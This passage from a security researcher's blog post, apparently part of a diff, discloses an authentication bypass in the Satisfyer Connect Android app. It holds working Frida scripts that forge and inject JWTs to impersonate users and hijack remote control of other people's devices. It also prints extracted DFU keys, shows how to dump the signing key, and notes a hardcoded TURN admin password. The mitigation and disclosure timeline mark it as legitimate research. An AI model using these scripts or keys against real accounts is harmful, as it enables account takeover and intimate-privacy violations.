+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got PID <span style="color:#ae81ff">19213</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Entered setSubject<span style="color:#f92672">()</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Entered claim<span style="color:#f92672">()</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got Token:
+eyJhb<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Hooking complete
+</code></pre></div><h3 id="using-the-forged-jwt">Using the Forged JWT</h3>
+<p>After creating a JWT for my test account, I&rsquo;ve simply changed the account&rsquo;s status message:</p>
+<p><img src="/img/satisfyer/put_status.png" alt="Set Status"></p>
+<p>Checking the status text of the victim revealed that this actually worked :D</p>
+<center>
+<img width="50%" src="/img/satisfyer/check_status.png">
+</center>
+<p><em>To create this screenshot, I had to use another <a href="https://www.securify.nl/blog/android-frida-hooking-disabling-flagsecure">Frida script to remove the secure flag</a> from the <code>View</code> class which is used to block the ability to take screenshots.</em></p>
+<p>Using the API is fine and all, but I wanted to inject the forged token into the running app, so that I could use features like remote control and calls more easily. I came up with a Frida script to generate and add a forged JWT into the app&rsquo;s local storage. This happens just before the app is going to check if a valid JWT already exists using the <code>hasToken()</code> method:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.domain.storage.impl.AuthStorageImpl&#34;</span>);
+<span style="color:#a6e22e">clazz</span>.<span style="color:#a6e22e">hasToken</span>.<span style="color:#a6e22e">overload</span>().<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+
+    <span style="color:#75715e">// create new forged token using the hooks described before
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">JwtTokenBuilderClass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.api.jwt.JwtTokenBuilder&#34;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jwtTokenBuilder</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JwtTokenBuilderClass</span>.<span style="color:#a6e22e">$new</span>();
+    <span style="color:#75715e">// createJwtToken() is hooked as well, see above for snippets
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwtTokenBuilder</span>.<span style="color:#a6e22e">createJwtToken</span>();
+
+    <span style="color:#75715e">// inject token into shared preferences and add bogus values to make the app happy
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setToken</span>(<span style="color:#a6e22e">token</span>);
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setLogin</span>(<span style="color:#e6db74">&#34;victim[...]&#34;</span>);
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setPassword</span>(<span style="color:#e6db74">&#34;NotReallyThePassword&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hasToken</span>();
+}
+</code></pre></div><p>The following demo shows the attacker&rsquo;s phone on the left and the tablet of another dude on the right. Let&rsquo;s call that dude <em>Antoine</em>.</p>
+<ol>
+<li>The attacker is logged in with some random account that&rsquo;s not relevant for the attack. This account has no friends.</li>
+<li>Antoine has a friend in the friends list called <em>victim</em>. In this case, <em>victim</em> refers to the account that is about to be impersonated.</li>
+<li>The Frida script is injected into the attacker&rsquo;s app. It restarts the app and forges a JWT for the victim account. After that, it gets injected into the session storage. At this point, the attacker impersonates the account of victim.</li>
+<li>Suddenly, the attacker has a friend in the friends list. This is the account of Antoine, since victim is a friend of his.</li>
+<li>The attacker can now message and call Antoine in the name of victim and could control the Satisfyer of Antoine in the name of victim. For this to work, Antoine has to grant access to the caller first, but since he and victim are friends, that should be totally safe, right?</li>
+</ol>
+<center>
+<video width="100%" height="100%" controls preload>
+    <source src="/img/satisfyer/demo.mp4"></source>
+</video>
+</center>
+<p><em>Fear my video editing skillz.</em></p>
+<hr>
+<center>
+<img width="50%" src="/img/satisfyer/bestmeme.jpeg">
+</center>
+<p>To summarize, the impact of this is quite interesting, since an attacker can now pose as any given user. Next to the ability to send messages as that user, access to the friends list of this compromised account is now possible as well. This means that, in case someone has granted <em>remote dildo access</em> to the compromised account over the Internet, the attacker could now hijack this and control the Satisfyer of another person. After all, the attacker is able to initiate remote sessions as any user.</p>
+<p>In the unlikely event that a victim realizes that their account is being impersonated, even changing the password doesn&rsquo;t help, since the attack doesn&rsquo;t even require that to be known.</p>
+<p><em>Note: I&rsquo;ve only tested and verified this using my own test accounts, I&rsquo;m not interested in controlling your Satisfyers, sorry.</em></p>
+<hr>
+<h3 id="possible-mitigation">Possible Mitigation</h3>
+<p>This issue can be mitigated entirely on the server side, since this is the component responsible for verifying JWT signatures:</p>
+<ol>
+<li>Although it&rsquo;s weird, users that are not logged in could still generate and sign their own JWTs on app startup.</li>
+<li>After successful authentication, the server replies with a new JWT that&rsquo;s valid for the respective user account.</li>
+<li>JWTs like this, with roles other than <code>ROLE_ANONYMOUS_CLIENT</code>, should be signed and verified with another key that never leaves the server.</li>
+</ol>
+<p>This way, no changes to the app should be required. It wouldn&rsquo;t be possible to forge JWTs anymore, since now two different signing keys are in use for anonymous and authenticated clients.</p>
+<h3 id="dumping-the-jwt-signing-key">Dumping the JWT Signing Key</h3>
+<p>For completeness sake, I&rsquo;ve dumped the JWT signing key using various methods. This key can then be used in external applications to create signed JWTs without relying on Frida and the Android application itself.</p>
+<br/>
+<h4 id="the-static-way-with-radare2">The Static Way with radare2</h4>
+<p>The easiest way is to extract the key statically:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ r2 -A libnative-lib.so
+Warning: run r2 with -e bin.cache<span style="color:#f92672">=</span>true to fix relocations in disassembly
+<span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze all flags starting with sym. and entry0 <span style="color:#f92672">(</span>aa<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>0x000009bc<span style="color:#f92672">]</span>&gt; afl
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+0x00000b40    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span>           sym.Java_com_coreteka_satisfyer_api_jwt_JwtTokenBuilder_getReleaseKey
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>0x00000a98<span style="color:#f92672">]</span>&gt; s sym.Java_com_coreteka_satisfyer_api_jwt_JwtTokenBuilder_getReleaseKey
+<span style="color:#f92672">[</span>0x00000b40<span style="color:#f92672">]</span>&gt; pdf
+            ; UNKNOWN XREF from section..dynsym @ +0x98
+┌ 20: sym.Java_com_coreteka_satisfyer_api_jwt_JwtTokenBuilder_getReleaseKey <span style="color:#f92672">(</span>int64_t arg1<span style="color:#f92672">)</span>;
+│           ; arg int64_t arg1 @ x0
+│           0x00000b40      080040f9       ldr x8, <span style="color:#f92672">[</span>x0<span style="color:#f92672">]</span>                ; 0xc7 ; load from memory to register; arg1
+│           0x00000b44      <span style="color:#ae81ff">01000090</span>       adrp x1, <span style="color:#ae81ff">0</span>
+│           0x00000b48      210c2191       add x1, x1, str.7fe6a81597158366<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span> ; 0x843 ; <span style="color:#e6db74">&#34;7fe6a81597158366[...]&#34;</span> ; add two values
+│           0x00000b4c      029d42f9       ldr x2, <span style="color:#f92672">[</span>x8, 0x538<span style="color:#f92672">]</span>         ; 0xcf ; load from memory to register
+└           0x00000b50      40001fd6       br x2
+<span style="color:#f92672">[</span>0x00000b40<span style="color:#f92672">]</span>&gt; pxq @ 0x843
+0x00000843  0x3531386136656637  0x3636333835313739   7fe6a81597158366
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>As you can see, a static key is loaded from address <code>0x843</code>.</p>
+<p>That was too easy, let&rsquo;s check other methods to dump the key.</p>
+<br/>
+<h4 id="the-dynamic-way-with-frida">The Dynamic Way with Frida</h4>
+<p>As can be seen in one of the listings above, the Java method <code>getReleaseKey()</code> is declared as <code>native</code>. This means that the implementation of this function is present in a shared library that contains native code.</p>
+<p>Calling things from the Java world into the native layer happens via <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/design.html">JNI</a>. Instead of bothering with the actual native implementation, Frida can be used to just call the <code>native</code> Java method and dump the returned value. This can be accomplished with the following script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">JwtTokenBuilderClass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.api.jwt.JwtTokenBuilder&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jwtTokenBuilder</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JwtTokenBuilderClass</span>.<span style="color:#a6e22e">$new</span>();
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Release Key: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">jwtTokenBuilder</span>.<span style="color:#a6e22e">getReleaseKey</span>());
+</code></pre></div><p>Another way is to use the Frida <code>Interceptor</code> to print the value returned by the <code>getReleaseKey()</code> export of the native library, outside of the Java layer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Interceptor</span>.<span style="color:#a6e22e">attach</span>(<span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">findExportByName</span>(<span style="color:#e6db74">&#34;libnative-lib.so&#34;</span>, <span style="color:#e6db74">&#34;Java_com_coreteka_satisfyer_api_jwt_JwtTokenBuilder_getReleaseKey&#34;</span>),{
+    <span style="color:#a6e22e">onEnter</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">hookEnter</span>,
+    <span style="color:#a6e22e">onLeave</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">hookLeave</span>
+});
+
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hookEnter</span>(<span style="color:#a6e22e">args</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] Enter getReleaseKey()&#34;</span>);
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hookLeave</span>(<span style="color:#a6e22e">ret</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] Leave getReleaseKey()&#34;</span>);
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">ret</span>);
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">    // if it would return a byte[] instead of String, one could use:
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">    // cast ret as byte[]
+</span><span style="color:#75715e">    var buffer = Java.array(&#39;byte&#39;, ret);
+</span><span style="color:#75715e">    var result = &#34;&#34;;
+</span><span style="color:#75715e">    for(var i = 0; i &lt; buffer.length; ++i){
+</span><span style="color:#75715e">        result += (String.fromCharCode(buffer[i]));
+</span><span style="color:#75715e">    }*/</span>
+}
+</code></pre></div><br>
+<h4 id="an-alternative-way-using-r2frida">An Alternative Way using r2Frida</h4>
+<p>Let&rsquo;s just assume that there are more complex things going on than simply returning a hardcoded string. A neat way to debug and trace the key generation would involve using r2Frida to dump memory and register contents when executing specific instructions. In this specific case, the contents of the <code>x1</code> register at offset <code>0xb4c</code> are of interest.</p>
+<p>The plan is as follows:</p>
+<ul>
+<li>Attach to the running app with r2Frida</li>
+<li>Get the base address of the shared library</li>
+<li>Add the offset <code>0xb4c</code> to this address</li>
+<li>Add a trace command for this address to dump the contents of the <code>x1</code> register</li>
+<li>Trigger the key generation</li>
+</ul>
+<p>Let&rsquo;s see how it works:</p>
+<center>
+<video width="100%" height="100%" controls preload>
+    <source src="/img/satisfyer/dump_key.webm"></source>
+</video>
+</center>
+<p>After triggering the generation of a JWT, tracing kicks in and dumps the value of <code>x1</code>, which is a pointer to the hardcoded string.</p>
+<hr>
+<p>As you can see, there are many ways Frida and r2Frida can be utilized to accomplish the same task. Depending on the target and requirements, these methods all have different advantages and disadvantages.</p>
+<h2 id="webrtc-via-coturn">WebRTC via coturn</h2>
+<p>An interesting feature of the Satisfyer ecosystem is that the app offers different ways to communicate with remote peers:</p>
+<ul>
+<li>End-to-End encrypted chats that support file attachments.</li>
+<li>Calls via WebRTC that support controlling other people&rsquo;s Satisfyer devices.</li>
+</ul>
+<p>The latter feature depends on an internet-facing TURN (<em>Traversal Using Relays around NAT</em>) server that acts as a relay. Checking out hardcoded constants in the app source code reveals the following connection information:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String TURN_SERVER_LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span><span style="color:#f92672">;</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String TURN_SERVER_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[...]&#34;</span><span style="color:#f92672">;</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String TURN_SERVER_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;turn:t1.[...].com:3478&#34;</span><span style="color:#f92672">;</span>
+</code></pre></div><p>As mentioned in the <a href="https://github.com/coturn/coturn/blob/ee432e160f665c9c12fb72b89c12765c511d1272/README.turnserver#L697">coturn readme file</a>, one should use <em>temporary</em> credentials generated by the coturn server to allow client connections:</p>
+<blockquote>
+<p><em>In the TURN REST API, there is no persistent passwords for users. A user has
+just the username. The password is always temporary, and it is generated by
+the web server on-demand, when the user accesses the WebRTC page. And,
+actually, a temporary one-time session only, username is provided to the user,
+too.</em></p>
+</blockquote>
+<p>This sounds different than what the Satisfyer app is currently using, since it uses an <code>admin</code> account with a static password. In fact, coturn servers offer a web interface that&rsquo;s only reachable via HTTPS that allow <code>admin</code> users to login. Among other things, this access could allow viewing connection details of peers connected to the TURN server. Let&rsquo;s just hope this panel is not accessible, right? RIGHT?</p>
+<p>I&rsquo;ve reported this and the vendor replied that they might patch this in the near future.</p>
+<h1 id="software-updates-and-dfu-mode">Software Updates and DFU Mode</h1>
+<p>Satisfyer devices support OTA updates, which allow the Android app to flash a new firmware via the DFU (<em>Device Firmware Update</em>) mode. Activating the DFU mode requires two things:</p>
+<ul>
+<li>Bluetooth pairing was completed successfully.</li>
+<li>Using a special DFU key to make a Satisfyer switch into DFU mode.</li>
+</ul>
+<p>Guess where the DFU key comes from. Right, the same shared library:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">DfuKeyClass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.ble.firmware.SettingsHelper&#34;</span>);
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">dfuKey</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DfuKeyClass</span>.<span style="color:#a6e22e">$new</span>();
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;DFU Key Generation 0: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dfuKey</span>.<span style="color:#a6e22e">getDfuKey</span>(<span style="color:#ae81ff">0</span>));
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;DFU Key Generation 1: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dfuKey</span>.<span style="color:#a6e22e">getDfuKey</span>(<span style="color:#ae81ff">1</span>));
+</code></pre></div><p>Here are the keys I&rsquo;ve dumped:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">DFU Key Generation 0: 4E46F8C5092B29E29A971A0CD1F610FB1F6763DF807A7E70960D4CD3118E601A
+DFU Key Generation 1: 4DB296E44E3CD64B003F78E584760B28B5B68417E5FD29D2DB9992618FFB62D5
+</code></pre></div><p>These keys are static and specific for device generations 0 and 1.</p>
+<p>All that&rsquo;s left to flash something into a test device is a firmware package of the vendor. Unfortunately, all of my Satisfyer devices were already shipped to me with up-to-date firmware. There&rsquo;s an API endpoint that allows downloading firmware images but it requires brute forcing various parameter values and I don&rsquo;t want to do that :D</p>
+<p>A quick idea was to order an old Satisfyer but then I&rsquo;ve noticed that buying items like these in used condition is very weird :S.</p>
+<h2 id="messing-with-ota-and-dfu">Messing with OTA and DFU</h2>
+<p>I&rsquo;ve found a way to trigger the update process, that is calling <code>updateFirmware(path)</code> of the class <code>ToyHolderController</code>. A great way to see what&rsquo;s actually going on is to place hooks in any classes used for logging purposes. In case of Satisfyer Connect, the <code>ZLogger</code> class is used in many places to produce debug messages. This is what triggering the update process with a test file looks like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: filePath<span style="color:#f92672">=</span>/data/local/tmp/123.bin, startAddr<span style="color:#f92672">=</span>56, icType<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: headBuf<span style="color:#f92672">=</span>050013370101C28E04400000
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: icType<span style="color:#f92672">=</span>0x05, secure_version<span style="color:#f92672">=</span>0x00, otaFlag<span style="color:#f92672">=</span>0x00, imageId<span style="color:#f92672">=</span>0x0101, imageVersion<span style="color:#f92672">=</span>0x00000000, crc16<span style="color:#f92672">=</span>0x8ec2, imageSize<span style="color:#f92672">=</span>0x00004004<span style="color:#f92672">(</span>16388<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: image: 1/1   <span style="color:#f92672">{</span>imageId<span style="color:#f92672">=</span>0x0000, version<span style="color:#f92672">=</span>0x0000<span style="color:#f92672">}</span>        progress: 0%<span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: OTA
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: image: 1/1   <span style="color:#f92672">{</span>imageId<span style="color:#f92672">=</span>0x0101, version<span style="color:#f92672">=</span>0x0000<span style="color:#f92672">}</span>        progress: 0%<span style="color:#f92672">(</span>0/16388<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: Ota Environment prepared.
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: DFU: 0x0205 &gt;&gt; 0x0206<span style="color:#f92672">(</span>PROGRESS_REMOTE_ENTER_OTA<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: <span style="color:#e6db74">&lt;&lt; OPCO</span>DE_ENTER_OTA_MODE<span style="color:#f92672">(</span>0x01<span style="color:#f92672">)</span>, enable device to enter OTA mode
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: <span style="color:#f92672">[</span>TX<span style="color:#f92672">]</span>0000ffd1-0000-1000-8000-00805f9b34fb &gt;&gt; <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span><span style="color:#ae81ff">01</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: 0x0000 - SUCCESS <span style="color:#e6db74">&lt;&lt; 0000ffd1-0000</span>-1000-8000-00805f9b34fb
+<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span><span style="color:#ae81ff">01</span>
+<span style="color:#f92672">[</span>ZLogger<span style="color:#f92672">]</span>: 4C:XX:XX:XX:XX:XX, status: 0x13-GATT_CONN_TERMINATE_PEER_USER , newState: 0-BluetoothProfile.STATE_DISCONNECTED
+</code></pre></div><p>Based on the debug messages, I&rsquo;ve started to build a file that can be flashed on the device. I&rsquo;ve lost interest in that shortly after but in case my results are helpful for anyone, you can check my Python script to generate such a file below:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#75715e"># header</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x47\x4D</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># sizeOfMergedFile</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;CCDDXXFFGGHHIIJJKKLLMMNNOOPPQQRR&#34;</span>
+
+<span style="color:#75715e"># extension</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x05\x05</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># subFileIndicator</span>
+<span style="color:#75715e"># 42 = count</span>
+<span style="color:#75715e"># startOffset 0 (count * 12 + 44)</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># start addr</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x10\x00</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># download addr</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x10\x00</span><span style="color:#e6db74">&#34;</span>
+
+FILE <span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x05\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;ZZaa&#34;</span>
+
+<span style="color:#75715e">### image file 1</span>
+
+<span style="color:#75715e"># ic version</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># secure version</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># no idea</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\x37</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># image id</span>
+FILE <span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x01</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># crc16</span>
+FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8e\x04</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># size</span>
+FILE <span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x40</span>):
+    FILE <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span>
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./thefile.bin&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(FILE)
+</code></pre></div><p>If anybody happens to have a flashable Satisfyer <code>.bin</code> file lying around, I&rsquo;ll offer $13.37 PayPal for it, I swear.</p>
+<hr>
+<h2 id="timeline">Timeline</h2>
+<ul>
+<li>06/11/2021: Sent report for insecure coturn setup with hardcoded admin password to  <code>security@satisfyer.com</code>.</li>
+<li>06/18/2021: Received notification that this issue might be addressed in the future.</li>
+<li>06/19/2021: Sent report for authentication bypass vulnerability to <code>security@satisfyer.com</code>.</li>
+<li>06/25/2021: Added additional details to report and asked for acknowledgement (again).</li>
+<li>06/30/2021: Sent info that blog post may be released soon to <code>security@satisfyer.com</code> and <code>app.support@satisfyer.com</code>.</li>
+<li>06/30/2021: Received acknowledgement, agreed that blog post will be released in max. two weeks, or before in case the vulnerability was fixed earlier.</li>
+<li>07/14/2021: Publishing blog post.</li>
+</ul>
+<hr>
+<p><marquee>Happy JWT-ing!</marquee></p>
+</div>
+
+    
+    
+
+    
+
+    <h4 id="related" class="page-header">Related</h4>
+
+     <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/tex/">Command Injection in LaTeX Workshop</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/vulnerability"><kbd class="item-tag">vulnerability</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/hisensehax/">Haxxoring a Hisense Smart TV</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/exploitation"><kbd class="item-tag">exploitation</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/vulnerability"><kbd class="item-tag">vulnerability</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/d3dhook/">Game Hacking #3: Hooking Direct3D EndScene()</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/c&#43;&#43;"><kbd class="item-tag">c&#43;&#43;</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/binary"><kbd class="item-tag">binary</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/gamehacking"><kbd class="item-tag">gamehacking</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/hooking"><kbd class="item-tag">hooking</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+</main>
+<footer id="footer">
+    <img style="width:42vh" src="/img/tag.png" class="alt-img" id="mafia-tag">
+
+    <p class="copyright text-muted">
+
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+    </p>
+</footer>
+</body>
+
+<script>
+    var footerWidth = 200;
+    $(document).ready(function () {
+        setWidth();
+        $(window).bind("resize", setWidth);
+    });
+
+    $(window).on('load', function () {
+        setWidth();
+    });
+
+    function setWidth() {
+        footerWidth = $("main").width();
+
+        $("#footer").css("min-width", (footerWidth > 300 ? footerWidth : 300) + "px");
+        
+    }
+
+    $(window).on('resize', function () {
+        setWidth();
+    });
+
+</script>
+
+</html>
+
+
+<script>
+    var width = 200;
+    $(document).ready(function () {
+        setMaxWidth();
+        $(window).bind("resize", setMaxWidth);
+    });
+
+
+    function setMaxWidth() {
+        $("pre > code").css("display", "none");
+        $("pre").css("display", "none");
+
+        width = $("#related").width();
+
+        $("pre > code").css("display", "block");
+        $("pre").css("display", "block");
+
+        $("pre > code").css("maxWidth", (width) + "px");
+        $("pre").css("maxWidth", (width) + "px");
+    }
+
+    $(window).on('resize', function () {
+        setMaxWidth();
+    });
+
+    $(window).on('load', function () {
+        setMaxWidth();
+    });
+
+
+
+</script>
